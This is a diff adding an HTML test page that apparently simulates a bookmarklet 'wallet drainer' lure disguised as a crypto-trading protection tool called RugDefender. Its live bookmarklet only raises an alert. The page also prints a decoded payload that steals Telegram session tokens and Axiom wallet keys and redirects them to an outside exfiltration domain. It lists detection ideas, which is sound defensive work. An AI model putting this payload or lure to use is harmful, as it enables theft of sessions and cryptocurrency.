@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>RugDefender - Protect Your Trades</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+    }
+    .container { max-width: 500px; text-align: center; }
+    .logo { font-size: 32px; font-weight: bold; margin-bottom: 16px; color: #00d4aa; }
+    .subtitle { color: #888; margin-bottom: 40px; }
+    .card {
+      background: rgba(255,255,255,0.05);
+      border-radius: 20px;
+      padding: 40px;
+      margin-bottom: 20px;
+    }
+    .drag-btn {
+      display: inline-block;
+      padding: 20px 40px;
+      background: linear-gradient(135deg, #00d4aa 0%, #00a080 100%);
+      border-radius: 12px;
+      color: #000;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: grab;
+      text-decoration: none;
+      margin-bottom: 20px;
+    }
+    .instructions {
+      color: #888;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+    .test-info {
+      background: rgba(255,71,87,0.1);
+      border: 1px solid #FF4757;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      text-align: left;
+    }
+    .test-info h4 { color: #FF4757; margin-bottom: 8px; }
+    .code-block {
+      background: #000;
+      border-radius: 8px;
+      padding: 16px;
+      margin-top: 20px;
+      text-align: left;
+      font-family: monospace;
+      font-size: 11px;
+      overflow-x: auto;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    .highlight { color: #FF4757; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="test-info">
+      <h4>TEST: Bookmark Drainer (Real Malware Pattern)</h4>
+      <p>This simulates the "Drag me to Start" bookmark attack. The bookmarklet steals:</p>
+      <ul style="margin-top: 8px; margin-left: 20px;">
+        <li>Telegram localStorage (session tokens)</li>
+        <li>Axiom bundle keys (wallet private keys)</li>
+        <li>Exfiltrates to attacker server via redirect</li>
+      </ul>
+    </div>
+
+    <div class="logo">RugDefender</div>
+    <p class="subtitle">Protect your trades from rug pulls</p>
+
+    <div class="card">
+      <a class="drag-btn" href="javascript:(()=>{alert('SIMULATED ATTACK: This would steal localStorage and wallet keys!');console.log('Stolen data:', {localStorage: Object.keys(localStorage), cookies: document.cookie.substring(0,50)});})()">
+        Drag me to Start
+      </a>
+      <p class="instructions">
+        Drag this button to your bookmarks bar, then click it on Axiom to activate RugDefender protection!
+      </p>
+    </div>
+
+    <div class="code-block">
+      <p style="color: #FF4757; margin-bottom: 12px;">DECODED MALICIOUS PAYLOAD:</p>
+      <pre>
+// 1. On Telegram - steal session
+if (location.hostname === 'web.telegram.org') {
+  const payload = btoa(JSON.stringify(
+    <span class="highlight">Object.fromEntries(Object.entries(localStorage))</span>
+  ));
+  <span class="highlight">location.replace('https://imjusta.cat/' + payload);</span>
+}
+
+// 2. On Axiom - steal wallet keys
+const user = await fetch('//api7.axiom.trade/user-info', {
+  credentials: 'include'
+}).json();
+
+const bundleData = await fetch('//api8.axiom.trade/bundle-key-and-wallets', {
+  credentials: 'include'
+}).json();
+
+const payload = {
+  site: location.href,
+  user: user,
+  <span class="highlight">bundle: bundleData.bundleKey,  // PRIVATE KEY!</span>
+  sBundles: localStorage.getItem('sBundles'),
+  userAgent: navigator.userAgent
+};
+
+<span class="highlight">location.replace('https://imjusta.cat/' + btoa(JSON.stringify(payload)));</span>
+      </pre>
+    </div>
+  </div>
+
+  <script>
+    // Log for testing
+    console.log('[TEST] Bookmark drainer simulation loaded');
+    console.log('[TEST] Attacker exfil domain: imjusta.cat');
+    console.log('[TEST] Detection opportunities:');
+    console.log('  - Scan bookmarks for javascript: URLs');
+    console.log('  - Monitor bulk localStorage access');
+    console.log('  - Detect redirect with base64 payload');
+  </script>
+</body>
+</html>
